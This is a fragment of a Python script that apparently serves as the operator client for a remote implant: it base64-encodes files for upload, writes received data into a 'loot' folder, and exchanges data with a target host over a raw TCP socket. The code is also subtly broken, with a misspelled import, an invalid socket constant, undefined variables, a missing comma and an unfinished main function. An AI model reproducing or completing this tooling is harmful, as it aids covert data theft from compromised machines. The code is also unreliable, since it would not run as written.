#!/usr/bin/env python3 
import os 
import socket 
import base64
import argsparse

def b64_file(file_up: str) -> bytes:
	with open(file_up, "rb") as f:
		myFile = f.read()
	myFileB64 = base64.b64encode(myFile)
	return myFileB64

def download(b64_down) -> None:
	decode = base64.b64decode(base64_in) 
	l00t_folder = "./loot/" + file_out
	with open(l00t_folder, "wb") as w:
		w.write(decode)
	return decode

def connection(dest: str, dest_port: int, data: str) -> bytes:
	with socket.socket(socket.AF_IFNET, socket.SOCK_STREAM) as s:
		conn = s.connect((dest, dest_port))
		s.send(data.encode("utf-8"))
		data = b""
		while True:
			part = s.recv(2048)
			data += part
			if len(part) < 2048:
				break
	return data

def main():
	parser = argparse.ArgumentParser(description="Communicates to Implant")
	parser.add_argument(
		"IP",
	 metavar="<destination_ip>",
	 help="Example: ./client.py <destination_host>"
	 )
	parser.add_argument(
		"PORT", 
		metavar="<destination_port>"
		help= "Example: ./client.py <destination_host> <destination_port>"
		)
	